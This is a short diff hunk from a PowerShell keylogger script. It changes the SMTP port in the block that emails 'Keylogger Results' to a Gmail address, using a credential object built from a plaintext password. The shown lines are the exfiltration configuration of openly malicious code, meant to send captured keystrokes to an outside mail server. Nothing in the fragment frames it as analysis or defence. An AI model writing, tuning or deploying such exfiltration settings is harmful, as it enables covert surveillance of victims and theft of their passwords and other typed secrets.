@@ -7,7 +7,7 @@ $To = "qwertyor1234@gmail.com"
 $Subject = "Keylogger Results"
 $body = "Keylogger Results"
 $SMTPServer = "smtp.gmail.com"
-$SMTPPort = "587"
+$SMTPPort = "465"
 $credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 ############################
 
